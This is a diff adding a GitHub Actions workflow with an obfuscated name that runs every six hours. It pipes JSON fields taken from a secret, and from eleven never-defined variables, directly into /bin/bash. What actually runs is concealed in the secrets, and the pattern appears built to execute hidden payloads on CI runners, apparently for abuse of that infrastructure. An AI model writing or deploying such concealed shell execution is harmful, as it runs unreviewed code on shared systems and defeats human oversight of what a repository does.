@@ -1,0 +1,27 @@
+name: laidaoleliechee
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: laidaoleliechee
+        env:
+          uer0: ${{ secrets.uer0 }}
+        run: |
+          echo $uer0 | jq -r .h42 | /bin/bash
+          echo $binit01 | jq -r .cwxf2 | /bin/bash
+          echo $bmj7 | jq -r .zovc90623 | /bin/bash
+          echo $iwtx7 | jq -r .rfr0 | /bin/bash
+          echo $qjmon39 | jq -r .r7753 | /bin/bash
+          echo $qcbpm12513 | jq -r .mq0432 | /bin/bash
+          echo $i1 | jq -r .znt0889 | /bin/bash
+          echo $xem1852 | jq -r .ezkq58 | /bin/bash
+          echo $aum98 | jq -r .al905 | /bin/bash
+          echo $kwcim96149 | jq -r .m9785 | /bin/bash
+          echo $n682 | jq -r .lne97 | /bin/bash
+          echo $yaoc2 | jq -r .xhyv34 | /bin/bash
+
